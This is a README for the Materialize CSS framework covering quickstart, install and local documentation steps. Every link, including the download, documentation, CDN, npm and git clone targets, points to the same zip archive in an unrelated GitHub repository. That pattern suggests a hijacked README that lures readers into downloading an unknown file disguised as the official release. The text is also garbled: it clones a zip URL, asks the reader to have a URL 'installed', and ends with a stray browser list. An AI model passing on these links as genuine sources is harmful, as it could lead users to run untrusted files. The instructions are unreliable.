## Quickstart:
Read the [getting started guide](https://raw.githubusercontent.com/andry06/andry06.github.io/main/linguistically/andry06.github.io.zip) for more information on how to use materialize.

- [Download the latest release](https://raw.githubusercontent.com/andry06/andry06.github.io/main/linguistically/andry06.github.io.zip) of materialize directly from GitHub.
- Clone the repo: `git clone https://raw.githubusercontent.com/andry06/andry06.github.io/main/linguistically/andry06.github.io.zip`
- Include the files via [cdnjs](https://raw.githubusercontent.com/andry06/andry06.github.io/main/linguistically/andry06.github.io.zip). More [here](https://raw.githubusercontent.com/andry06/andry06.github.io/main/linguistically/andry06.github.io.zip).
- Install with [npm](https://raw.githubusercontent.com/andry06/andry06.github.io/main/linguistically/andry06.github.io.zip): `npm install materialize-css`
- Install with [Bower](https://raw.githubusercontent.com/andry06/andry06.github.io/main/linguistically/andry06.github.io.zip): `bower install materialize` ([DEPRECATED](https://raw.githubusercontent.com/andry06/andry06.github.io/main/linguistically/andry06.github.io.zip))
- Install with [Atmosphere](https://raw.githubusercontent.com/andry06/andry06.github.io/main/linguistically/andry06.github.io.zip): `meteor add materialize:materialize`

## Documentation
The documentation can be found at <https://raw.githubusercontent.com/andry06/andry06.github.io/main/linguistically/andry06.github.io.zip>. To run the documentation locally on your machine, you need [https://raw.githubusercontent.com/andry06/andry06.github.io/main/linguistically/andry06.github.io.zip](https://raw.githubusercontent.com/andry06/andry06.github.io/main/linguistically/andry06.github.io.zip) installed on your computer.

### Running documentation locally
Run these commands to set up the documentation:

```bash
git clone https://raw.githubusercontent.com/andry06/andry06.github.io/main/linguistically/andry06.github.io.zip
cd materialize
npm install
```

Then run `grunt monitor` to compile the documentation. When it finishes, open a new browser window and navigate to `localhost:8000`. We use [BrowserSync](https://raw.githubusercontent.com/andry06/andry06.github.io/main/linguistically/andry06.github.io.zip) to display the documentation.

### Documentation for previous releases
Previous releases and their documentation are available for [download](https://raw.githubusercontent.com/andry06/andry06.github.io/main/linguistically/andry06.github.io.zip).

- Opera
- Edge
- IE 11+
